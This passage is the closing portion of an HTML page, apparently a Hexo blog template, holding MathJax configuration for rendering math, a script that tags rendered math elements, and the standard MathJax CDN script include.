            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
            processEscapes: true
        }
    });
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax();
        for (var i = 0; i < all.length; ++i)
            all[i].SourceElement().parentNode.className += ' has-jax';
    });
</script>
<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
</body>

</html>